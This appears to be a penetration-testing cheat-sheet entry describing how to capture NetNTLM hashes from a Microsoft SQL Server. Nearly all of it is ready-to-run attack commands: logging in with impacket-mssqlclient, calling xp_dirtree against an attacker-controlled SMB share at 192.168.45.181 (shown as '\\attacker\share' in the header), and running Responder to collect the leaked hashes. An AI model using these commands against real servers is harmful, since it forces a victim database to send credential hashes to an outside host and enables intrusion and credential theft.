---
title: MSSQL xp_dirtree Hash Capture
category: initial-access
subcategory: sqli
os: linux
command: xp_dirtree \\attacker\share
tools: impacket-mssqlclient, responder
---


### Connect to MSSQL

```bash
impacket-mssqlclient 'db_user':'Password123!'@192.168.116.158 -windows-auth
```

### Enable advanced options and trigger SMB request

```sql
sp_configure 'show advanced options', 1
xp_dirtree \\192.168.45.181\share;
```

### Capture the NetNTLM hash

```bash
sudo responder -I tun0 --verbose
```
